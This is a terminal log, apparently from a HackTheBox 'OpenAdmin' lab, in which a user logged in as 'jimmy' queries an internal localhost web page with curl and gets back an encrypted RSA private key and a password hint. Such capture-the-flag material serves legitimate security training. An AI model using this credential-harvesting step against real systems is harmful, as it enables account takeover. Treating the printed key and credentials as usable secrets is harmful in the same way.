+ * Canonical Livepatch is available for installation.                           
+   - Reduce system reboots and improve kernel security. Activate at:            
+     https://ubuntu.com/livepatch       
+
+41 packages can be updated.             
+12 updates are security updates.        
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Jan 10 23:21:36 2020 from 10.10.14.40                           
+jimmy@openadmin:~$ cd /var/www/internal    
+jimmy@openadmin:/var/www/internal$ ls      
+index.php  logout.php  main.php            
+jimmy@openadmin:/var/www/internal$ clear   
+jimmy@openadmin:/var/www/internal$ ls      
+index.php  logout.php  main.php            
+jimmy@openadmin:/var/www/internal$ less index.php                                      
+jimmy@openadmin:/var/www/internal$ less main.php                                       
+jimmy@openadmin:/var/www/internal$ curl -d "username=jimmy:password=Revealed" 127.0.0.1:52846/main.php                                                                        
+<pre>-----BEGIN RSA PRIVATE KEY-----       
+Proc-Type: 4,ENCRYPTED                     
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D                                 
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8                       
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO                       
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE                       
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ                       
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du                       
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI                       
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4                       
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/                       
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH                       
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ                       
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb                       
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80                       
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg                       
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F                       
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh                       
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa                       
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z                       
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr                       
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2                       
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79                       
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM                       
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt                       
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt                       
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe                       
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN                       
+-----END RSA PRIVATE KEY-----              
+</pre><html>                               
+<h3>Don't forget your "ninja" password</h3>                                            
+Click here to logout <a href="logout.php" tite = "Logout">Session                      
+</html>                                    
+jimmy@openadmin:/var/www/internal$ less index.php                                      
+jimmy@openadmin:/var/www/internal$ less main.php                                       
+jimmy@openadmin:/var/www/internal$ exit    
+logout                                     
+Connection to 10.10.10.171 closed.         
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #                                     
